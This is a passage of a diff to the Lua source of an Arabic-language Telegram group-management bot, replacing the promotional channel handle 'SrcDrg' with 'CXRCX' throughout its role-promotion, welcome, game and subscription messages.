+Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n⌯︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
 DevAIAN:sadd(WAAD..'AIAN:Managers:'..msg.chat_id_, result.id_)
 DevAIAN:set(WAAD.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
 elseif mrAIAN == "عضو" then
-Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'SrcDrg')..')'..' ❩\n⌯︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
+Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n⌯︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
 end
 else
 Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙*المعرف غير صحيح*", 1, 'md')
@@ -1990,19 +1985,19 @@ function py_username(extra, result, success)
 if result.id_ then
 local mrAIAN = DevAIAN:get(WAAD.."Comd:New:rt:AIAN:"..text1[2]..msg.chat_id_)
 if mrAIAN == "مميز" and VipMem(msg) then
-Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'SrcDrg')..')'..' ❩\n⌯︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
+Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n⌯︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
 DevAIAN:srem(WAAD..'AIAN:VipMem:'..msg.chat_id_, result.id_)
 DevAIAN:del(WAAD.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
 elseif mrAIAN == "ادمن" and Admin(msg) then 
-Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'SrcDrg')..')'..' ❩\n⌯︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
+Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n⌯︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
 DevAIAN:srem(WAAD..'AIAN:Admins:'..msg.chat_id_, result.id_)
 DevAIAN:del(WAAD.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
 elseif mrAIAN == "مدير" and Manager(msg) then
-Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'SrcDrg')..')'..' ❩\n⌯︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
+Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n⌯︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
 DevAIAN:srem(WAAD..'AIAN:Managers:'..msg.chat_id_, result.id_)
 DevAIAN:del(WAAD.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
 elseif mrAIAN == "عضو" then
-Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'SrcDrg')..')'..' ❩\n⌯︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
+Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'CXRCX')..')'..' ❩\n⌯︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
 end
 else
 Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙*المعرف غير صحيح*", 1, 'md')
@@ -2226,7 +2221,7 @@ end
 --     Source WAAD     --
 if not SecondSudo(msg) and not DevAIAN:sismember(WAAD..'AIAN:Ban:Pv',msg.sender_user_id_) and not DevAIAN:get(WAAD..'AIAN:Texting:Pv') then
 tdcli_function({ID="GetUser",user_id_=WAAD},function(arg,chat) 
-Dev_AIAN(msg.sender_user_id_, msg.id_, 1, '⌯︙تم ارسال رسالتك الى [المطور](t.me/'..(chat.username_ or "SrcDrg")..')', 1, 'md') 
+Dev_AIAN(msg.sender_user_id_, msg.id_, 1, '⌯︙تم ارسال رسالتك الى [المطور](t.me/'..(chat.username_ or "CXRCX")..')', 1, 'md') 
 tdcli_function({ID="ForwardMessages",chat_id_=WAAD,from_chat_id_= msg.sender_user_id_,message_ids_={[0]=msg.id_},disable_notification_=1,from_background_=1},function(arg,data) 
 tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
 if data and data.messages_ and data.messages_[0] ~= false and data.ID ~= "Error" then
@@ -3131,7 +3126,7 @@ Welcomes = '• نورت حبي \n• firstname \n• username'
 end
 local Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
 local Welcomes = Welcomes:gsub('firstname',('['..result.first_name_..']' or ''))
-local Welcomes = Welcomes:gsub('username',('[@'..result.username_..']' or '[@SrcDrg]'))
+local Welcomes = Welcomes:gsub('username',('[@'..result.username_..']' or '[@CXRCX]'))
 Dev_AIAN(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
 end 
 if DevAIAN:get(WAAD.."AIAN:Lock:Welcome"..msg.chat_id_) then
@@ -3179,7 +3174,7 @@ Welcomes = '• نورت حبي \n• firstname \n• username'
 end
 local Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
 local Welcomes = Welcomes:gsub('firstname',('['..msg.content_.members_[0].first_name_..']' or ''))
-local Welcomes = Welcomes:gsub('username',('[@'..msg.content_.members_[0].username_..']' or '[@SrcDrg]'))
+local Welcomes = Welcomes:gsub('username',('[@'..msg.content_.members_[0].username_..']' or '[@CXRCX]'))
 Dev_AIAN(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
 end
 --     Source WAAD     --
@@ -4621,7 +4616,7 @@ Dev_AIAN(msg.chat_id_, msg.id_, 1,[[
 ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
 ⌯︙نقاطي • بيع نقاطي
 ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
-[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/SrcDrg)➤
+[🖥┇𝐒𝐎𝐔𝐑𝐂𝐄 𝐃𝐑𝐀𝐆𝐎𝐍 .](t.me/CXRCX)➤
 ]], 1, 'md')
 else
 Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙عذرا الالعاب معطله في المجموعه', 1, 'md')
@@ -4649,7 +4644,7 @@ keyboard.inline_keyboard = {
 {{text="🔵 لعبة الالوان 🔴",url='https://t.me/T4TTTTBOT?game=color'}},
 {{text="🚀 لعبة الصاروخ 🚀",url='https://t.me/T4TTTTBOT?game=rocket'},{text="🏹 لعبة السهام 🏹",url='https://t.me/T4TTTTBOT?game=arrow'}},
 {{text="لعبة النينجا",url='https://t.me/gamee?game=GravityNinja21'},{text="لعبة الكرتي",url='https://t.me/gamee?game=KarateKid2'}},
-{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/SrcDrg"}},
+{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -4824,7 +4819,7 @@ local text =  [[⌯︙عذࢪاَ ]]..WAAD..[[ , آنت لست مشتࢪك
 
 ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ
 ]] 
-local inline = {{{text = '• اضغط هنا للاشتراك •', url="t.me/SrcDrg"}}}
+local inline = {{{text = '• اضغط هنا للاشتراك •', url="t.me/CXRCX"}}}
 fucktele =  msg.id_/2097152/0.5
 SendInline(msg.chat_id_,text,nil,inline,fucktele) 
 return false
@@ -4833,7 +4828,7 @@ local Text =[[
 ⦑ Welcome to Source ⦒
  ⦑ Source WAAD ⦒ 
 ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ 
-⌯︙ [Source Channel](t.me/SrcDrg)
+⌯︙ [Source Channel](t.me/CXRCX)
 ⌯︙ [Source Update ](t.me/FIDRG) 
 ⌯︙ [Source developer](t.me/VvTVv2) 
 ⌯︙ [Source programmer](t.me/mndzr) 
@@ -4843,11 +4838,11 @@ local Text =[[
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = '𝐃𝐑𝐀𝐆𝐎𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/SrcDrg"},
+{text = '𝐃𝐑𝐀𝐆𝐎𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/CXRCX"},
 },
 }
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SrcDrg&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
+https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/CXRCX&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
 --     Source WAAD     --
 if ChatType == 'sp' or ChatType == 'gp'  then
@@ -5009,7 +5004,7 @@ tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = WAAD,offset_ = 0,limit_ 
 if DevText then
 if SoOoFi.photos_[0] then
 keyboard = {} 
-keyboard.inline_keyboard = {{{text=dp.first_name_,url=("t.me/"..dp.username_ or "t.me/SrcDrg")}}}
+keyboard.inline_keyboard = {{{text=dp.first_name_,url=("t.me/"..dp.username_ or "t.me/CXRCX")}}}
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id='..msg.chat_id_..'&photo='..SoOoFi.photos_[0].sizes_[1].photo_.persistent_id_..'&caption='..URL.escape(DevText).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 else
@@ -5020,7 +5015,7 @@ if SoOoFi.photos_[0] then
 local bio = GetBio(dp.id_,msg.chat_id_)
 local Text = '⌯︙*D𝐞𝐯 N𝐞𝐦𝐚* ↬ '..DevName..'\n⌯︙*D𝐞𝐯 U𝐬𝐞𝐫* ↬ ['..DevUser..']\n⌯︙*D𝐞𝐯 I𝐝* ↬ ( `'..WAAD..'` )'..DevCh..'\n⌯︙*D𝐞𝐯 B𝐢𝐨* ↬ ['..bio..']'
 keyboard = {} 
-keyboard.inline_keyboard = {{{text='• '..dp.first_name_..' •',url=("t.me/"..dp.username_ or "t.me/SrcDrg")}}}
+keyboard.inline_keyboard = {{{text='• '..dp.first_name_..' •',url=("t.me/"..dp.username_ or "t.me/CXRCX")}}}
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id='..msg.chat_id_..'&photo='..SoOoFi.photos_[0].sizes_[1].photo_.persistent_id_..'&caption='..URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 else
@@ -6092,23 +6087,23 @@ if dp.first_name_ == false then
 Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙الحساب محذوف", 1, "md")
 return false  
 end
-local Text = ' ⌯︙قم باستعمال الازرار لرفع العضو ↫ ⤈\n⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'SrcDrg')..')\n✓'
+local Text = ' ⌯︙قم باستعمال الازرار لرفع العضو ↫ ⤈\n⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n✓'
 if Sudo(msg) then
-inline = {{{text="رفع مميز",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="رفع ادمن",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text="رفع منشئ",callback_data=msg.sender_user_id_..":SetConstructor:"..result.sender_user_id_},{text="رفع مدير",callback_data=msg.sender_user_id_..":SetManager:"..result.sender_user_id_}},{{text="رفع منظف",callback_data=msg.sender_user_id_..":SetCleaner:"..result.sender_user_id_},{text="رفع منشئ اساسي",callback_data=msg.sender_user_id_..":SetBasicConstructor:"..result.sender_user_id_}},{{text="رفع مالك",callback_data=msg.sender_user_id_..":SetAIANConstructor:"..result.sender_user_id_},{text="رفع مطور",callback_data=msg.sender_user_id_..":SetSudoBot:"..result.sender_user_id_}},{{text="رفع مطور ثانوي",callback_data=msg.sender_user_id_..":SetSecondSudo:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/SrcDrg"}}}
+inline = {{{text="رفع مميز",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="رفع ادمن",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text="رفع منشئ",callback_data=msg.sender_user_id_..":SetConstructor:"..result.sender_user_id_},{text="رفع مدير",callback_data=msg.sender_user_id_..":SetManager:"..result.sender_user_id_}},{{text="رفع منظف",callback_data=msg.sender_user_id_..":SetCleaner:"..result.sender_user_id_},{text="رفع منشئ اساسي",callback_data=msg.sender_user_id_..":SetBasicConstructor:"..result.sender_user_id_}},{{text="رفع مالك",callback_data=msg.sender_user_id_..":SetAIANConstructor:"..result.sender_user_id_},{text="رفع مطور",callback_data=msg.sender_user_id_..":SetSudoBot:"..result.sender_user_id_}},{{text="رفع مطور ثانوي",callback_data=msg.sender_user_id_..":SetSecondSudo:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
 elseif SecondSudo(msg) then
-inline = {{{text="رفع مميز",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="رفع ادمن",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text="رفع منشئ",callback_data=msg.sender_user_id_..":SetConstructor:"..result.sender_user_id_},{text="رفع مدير",callback_data=msg.sender_user_id_..":SetManager:"..result.sender_user_id_}},{{text="رفع منظف",callback_data=msg.sender_user_id_..":SetCleaner:"..result.sender_user_id_},{text="رفع منشئ اساسي",callback_data=msg.sender_user_id_..":SetBasicConstructor:"..result.sender_user_id_}},{{text="رفع مالك",callback_data=msg.sender_user_id_..":SetAIANConstructor:"..result.sender_user_id_},{text="رفع مطور",callback_data=msg.sender_user_id_..":SetSudoBot:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/SrcDrg"}}}
+inline = {{{text="رفع مميز",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="رفع ادمن",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text="رفع منشئ",callback_data=msg.sender_user_id_..":SetConstructor:"..result.sender_user_id_},{text="رفع مدير",callback_data=msg.sender_user_id_..":SetManager:"..result.sender_user_id_}},{{text="رفع منظف",callback_data=msg.sender_user_id_..":SetCleaner:"..result.sender_user_id_},{text="رفع منشئ اساسي",callback_data=msg.sender_user_id_..":SetBasicConstructor:"..result.sender_user_id_}},{{text="رفع مالك",callback_data=msg.sender_user_id_..":SetAIANConstructor:"..result.sender_user_id_},{text="رفع مطور",callback_data=msg.sender_user_id_..":SetSudoBot:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
 elseif SudoBot(msg) then
-inline = {{{text="رفع مميز",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="رفع ادمن",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text="رفع منشئ",callback_data=msg.sender_user_id_..":SetConstructor:"..result.sender_user_id_},{text="رفع مدير",callback_data=msg.sender_user_id_..":SetManager:"..result.sender_user_id_}},{{text="رفع منظف",callback_data=msg.sender_user_id_..":SetCleaner:"..result.sender_user_id_},{text="رفع منشئ اساسي",callback_data=msg.sender_user_id_..":SetBasicConstructor:"..result.sender_user_id_}},{{text="رفع مالك",callback_data=msg.sender_user_id_..":SetAIANConstructor:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/SrcDrg"}}}
+inline = {{{text="رفع مميز",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="رفع ادمن",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text="رفع منشئ",callback_data=msg.sender_user_id_..":SetConstructor:"..result.sender_user_id_},{text="رفع مدير",callback_data=msg.sender_user_id_..":SetManager:"..result.sender_user_id_}},{{text="رفع منظف",callback_data=msg.sender_user_id_..":SetCleaner:"..result.sender_user_id_},{text="رفع منشئ اساسي",callback_data=msg.sender_user_id_..":SetBasicConstructor:"..result.sender_user_id_}},{{text="رفع مالك",callback_data=msg.sender_user_id_..":SetAIANConstructor:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
 elseif AIANConstructor(msg) then
-inline = {{{text="رفع مميز",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="رفع ادمن",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text="رفع منشئ",callback_data=msg.sender_user_id_..":SetConstructor:"..result.sender_user_id_},{text="رفع مدير",callback_data=msg.sender_user_id_..":SetManager:"..result.sender_user_id_}},{{text="رفع منظف",callback_data=msg.sender_user_id_..":SetCleaner:"..result.sender_user_id_},{text="رفع منشئ اساسي",callback_data=msg.sender_user_id_..":SetBasicConstructor:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/SrcDrg"}}}
+inline = {{{text="رفع مميز",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="رفع ادمن",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text="رفع منشئ",callback_data=msg.sender_user_id_..":SetConstructor:"..result.sender_user_id_},{text="رفع مدير",callback_data=msg.sender_user_id_..":SetManager:"..result.sender_user_id_}},{{text="رفع منظف",callback_data=msg.sender_user_id_..":SetCleaner:"..result.sender_user_id_},{text="رفع منشئ اساسي",callback_data=msg.sender_user_id_..":SetBasicConstructor:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
 elseif BasicConstructor(msg) then
-inline = {{{text="رفع مميز",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="رفع ادمن",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text="رفع منشئ",callback_data=msg.sender_user_id_..":SetConstructor:"..result.sender_user_id_},{text="رفع مدير",callback_data=msg.sender_user_id_..":SetManager:"..result.sender_user_id_}},{{text="رفع منظف",callback_data=msg.sender_user_id_..":SetCleaner:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/SrcDrg"}}}
+inline = {{{text="رفع مميز",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="رفع ادمن",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text="رفع منشئ",callback_data=msg.sender_user_id_..":SetConstructor:"..result.sender_user_id_},{text="رفع مدير",callback_data=msg.sender_user_id_..":SetManager:"..result.sender_user_id_}},{{text="رفع منظف",callback_data=msg.sender_user_id_..":SetCleaner:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
 elseif Constructor(msg) then
-inline = {{{text="رفع مميز",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="رفع ادمن",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text="رفع منظف",callback_data=msg.sender_user_id_..":SetCleaner:"..result.sender_user_id_},{text="رفع مدير",callback_data=msg.sender_user_id_..":SetManager:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/SrcDrg"}}}
+inline = {{{text="رفع مميز",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="رفع ادمن",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text="رفع منظف",callback_data=msg.sender_user_id_..":SetCleaner:"..result.sender_user_id_},{text="رفع مدير",callback_data=msg.sender_user_id_..":SetManager:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
 elseif Manager(msg) then
-inline = {{{text="رفع مميز",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="رفع ادمن",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/SrcDrg"}}}
+inline = {{{text="رفع مميز",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_},{text="رفع ادمن",callback_data=msg.sender_user_id_..":SetAdmin:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
 elseif Admin(msg) then
-inline = {{{text="رفع مميز",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/SrcDrg"}}}
+inline = {{{text="رفع مميز",callback_data=msg.sender_user_id_..":SetMem:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
 end
 SendInline(msg.chat_id_,Text,nil,inline,msg.id_/2097152/0.5)
 end,nil)
@@ -6126,23 +6121,23 @@ if dp.first_name_ == false then
 Dev_AIAN(msg.chat_id_, msg.id_, 1, "⌯︙الحساب محذوف", 1, "md")
 return false  
 end
-local Text = ' ⌯︙قم باستعمال الازرار لتنزيل العضو ↫ ⤈\n⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'SrcDrg')..')\n✓'
+local Text = ' ⌯︙قم باستعمال الازرار لتنزيل العضو ↫ ⤈\n⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n✓'
 if Sudo(msg) then
-inline = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..result.sender_user_id_},{text="تنزيل ادمن",callback_data=msg.sender_user_id_..":RemAdmin:"..result.sender_user_id_}},{{text="تنزيل منشئ",callback_data=msg.sender_user_id_..":RemConstructor:"..result.sender_user_id_},{text="تنزيل مدير",callback_data=msg.sender_user_id_..":RemManager:"..result.sender_user_id_}},{{text="تنزيل منظف",callback_data=msg.sender_user_id_..":RemCleaner:"..result.sender_user_id_},{text="تنزيل منشئ اساسي",callback_data=msg.sender_user_id_..":RemBasicConstructor:"..result.sender_user_id_}},{{text="تنزيل مالك",callback_data=msg.sender_user_id_..":RemAIANConstructor:"..result.sender_user_id_},{text="تنزيل مطور",callback_data=msg.sender_user_id_..":RemSudoBot:"..result.sender_user_id_}},{{text="تنزيل مطور ثانوي",callback_data=msg.sender_user_id_..":RemSecondSudo:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/SrcDrg"}}}
+inline = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..result.sender_user_id_},{text="تنزيل ادمن",callback_data=msg.sender_user_id_..":RemAdmin:"..result.sender_user_id_}},{{text="تنزيل منشئ",callback_data=msg.sender_user_id_..":RemConstructor:"..result.sender_user_id_},{text="تنزيل مدير",callback_data=msg.sender_user_id_..":RemManager:"..result.sender_user_id_}},{{text="تنزيل منظف",callback_data=msg.sender_user_id_..":RemCleaner:"..result.sender_user_id_},{text="تنزيل منشئ اساسي",callback_data=msg.sender_user_id_..":RemBasicConstructor:"..result.sender_user_id_}},{{text="تنزيل مالك",callback_data=msg.sender_user_id_..":RemAIANConstructor:"..result.sender_user_id_},{text="تنزيل مطور",callback_data=msg.sender_user_id_..":RemSudoBot:"..result.sender_user_id_}},{{text="تنزيل مطور ثانوي",callback_data=msg.sender_user_id_..":RemSecondSudo:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
 elseif SecondSudo(msg) then
-inline = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..result.sender_user_id_},{text="تنزيل ادمن",callback_data=msg.sender_user_id_..":RemAdmin:"..result.sender_user_id_}},{{text="تنزيل منشئ",callback_data=msg.sender_user_id_..":RemConstructor:"..result.sender_user_id_},{text="تنزيل مدير",callback_data=msg.sender_user_id_..":RemManager:"..result.sender_user_id_}},{{text="تنزيل منظف",callback_data=msg.sender_user_id_..":RemCleaner:"..result.sender_user_id_},{text="تنزيل منشئ اساسي",callback_data=msg.sender_user_id_..":RemBasicConstructor:"..result.sender_user_id_}},{{text="تنزيل مالك",callback_data=msg.sender_user_id_..":RemAIANConstructor:"..result.sender_user_id_},{text="تنزيل مطور",callback_data=msg.sender_user_id_..":RemSudoBot:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/SrcDrg"}}}
+inline = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..result.sender_user_id_},{text="تنزيل ادمن",callback_data=msg.sender_user_id_..":RemAdmin:"..result.sender_user_id_}},{{text="تنزيل منشئ",callback_data=msg.sender_user_id_..":RemConstructor:"..result.sender_user_id_},{text="تنزيل مدير",callback_data=msg.sender_user_id_..":RemManager:"..result.sender_user_id_}},{{text="تنزيل منظف",callback_data=msg.sender_user_id_..":RemCleaner:"..result.sender_user_id_},{text="تنزيل منشئ اساسي",callback_data=msg.sender_user_id_..":RemBasicConstructor:"..result.sender_user_id_}},{{text="تنزيل مالك",callback_data=msg.sender_user_id_..":RemAIANConstructor:"..result.sender_user_id_},{text="تنزيل مطور",callback_data=msg.sender_user_id_..":RemSudoBot:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
 elseif SudoBot(msg) then
-inline = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..result.sender_user_id_},{text="تنزيل ادمن",callback_data=msg.sender_user_id_..":RemAdmin:"..result.sender_user_id_}},{{text="تنزيل منشئ",callback_data=msg.sender_user_id_..":RemConstructor:"..result.sender_user_id_},{text="تنزيل مدير",callback_data=msg.sender_user_id_..":RemManager:"..result.sender_user_id_}},{{text="تنزيل منظف",callback_data=msg.sender_user_id_..":RemCleaner:"..result.sender_user_id_},{text="تنزيل منشئ اساسي",callback_data=msg.sender_user_id_..":RemBasicConstructor:"..result.sender_user_id_}},{{text="تنزيل مالك",callback_data=msg.sender_user_id_..":RemAIANConstructor:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/SrcDrg"}}}
+inline = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..result.sender_user_id_},{text="تنزيل ادمن",callback_data=msg.sender_user_id_..":RemAdmin:"..result.sender_user_id_}},{{text="تنزيل منشئ",callback_data=msg.sender_user_id_..":RemConstructor:"..result.sender_user_id_},{text="تنزيل مدير",callback_data=msg.sender_user_id_..":RemManager:"..result.sender_user_id_}},{{text="تنزيل منظف",callback_data=msg.sender_user_id_..":RemCleaner:"..result.sender_user_id_},{text="تنزيل منشئ اساسي",callback_data=msg.sender_user_id_..":RemBasicConstructor:"..result.sender_user_id_}},{{text="تنزيل مالك",callback_data=msg.sender_user_id_..":RemAIANConstructor:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
 elseif AIANConstructor(msg) then
-inline = {{{text="تنزيل مميز",callback_data=msg.sender_user_id_..":RemMem:"..result.sender_user_id_},{text="تنزيل ادمن",callback_data=msg.sender_user_id_..":RemAdmin:"..result.sender_user_id_}},{{text="تنزيل منشئ",callback_data=msg.sender_user_id_..":RemConstructor:"..result.sender_user_id_},{text="تنزيل مدير",callback_data=msg.sender_user_id_..":RemManager:"..result.sender_user_id_}},{{text="تنزيل منظف",callback_data=msg.sender_user_id_..":RemCleaner:"..result.sender_user_id_},{text="تنزيل منشئ اساسي",callback_data=msg.sender_user_id_..":RemBasicConstructor:"..result.sender_user_id_}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/SrcDrg"}}}
